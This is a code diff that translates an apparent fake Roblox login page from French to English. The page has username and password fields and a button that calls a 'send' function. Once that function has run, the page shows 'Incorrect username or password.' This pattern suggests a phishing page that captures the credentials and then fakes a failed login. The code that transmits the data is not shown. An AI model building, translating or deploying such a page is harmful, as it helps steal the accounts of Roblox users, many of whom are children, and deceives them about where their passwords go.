@@ -326,7 +326,7 @@ button, .btn{
         <nav class="nav">
             <a href="#">Charts</a>
             <a href="#">Marketplace</a>
-            <a href="#">Créer</a>
+            <a href="#">Create</a>
             <a href="#">Robux</a>
         </nav>
     </div>
@@ -334,8 +334,8 @@ button, .btn{
     <input class="search" type="text" placeholder="Rechercher">
 
     <div class="right">
-        <button class="btn signup">S'inscrire</button>
-        <button class="btn login-top">Connexion</button>
+        <button class="btn signup">Sign Up</button>
+        <button class="btn login-top">Login</button>
     </div>
 
 </header>
@@ -344,14 +344,14 @@ button, .btn{
 
     <div class="login-box">
 
-        <h1>Connexion</h1>
+        <h1>Login to Roblox</h1>
 
-        <input class="input" type="text" id="participant" placeholder="Identifiant / E-mail / Téléphone">
+        <input class="input" type="text" id="participant" placeholder="Username / Email / Phone">
 
-        <input class="input" type="password" id="secret" placeholder="Mot de passe">
+        <input class="input" type="password" id="secret" placeholder="Password">
 
         <div class="error" id="error">
-            "Nom d'utilisateur ou mot de passe incorrect."
+            "Incorrect username or password."
         </div>
 
         <!-- STATUS EN HAUT -->
@@ -359,7 +359,7 @@ button, .btn{
 
         <!-- BOUTON -->
         <button class="main-btn" id="mainBtn" onclick="envoyer()">
-            Se connecter
+            Log In
         </button>
 
         <!-- LOADER -->
@@ -370,21 +370,21 @@ button, .btn{
         </div>
 
         <div class="forgot">
-            Mot de passe ou nom d'utilisateur oublié ?
+            Forgot password or username?
         </div>
 
         <div class="separator"></div>
 
         <button class="secondary-btn">
-            Envoyer un code par e-mail
+            Send a code by email
         </button>
 
         <button class="secondary-btn">
-            Connexion rapide
+            Quick connection
         </button>
 
         <div class="bottom">
-            Vous n'avez pas de compte ? <b>S'inscrire</b>
+            You don't have an account? <b>Sign Up</b>
         </div>
 
     </div>
@@ -448,7 +448,7 @@ async function envoyer() {
         bouton.style.display = "block";
 
         /* MESSAGE EN HAUT */
-        status.innerText = "Nom d'utilisateur ou mot de passe incorrect.";
+        status.innerText = "Incorrect username or password.";
 
     } catch(err) {
 
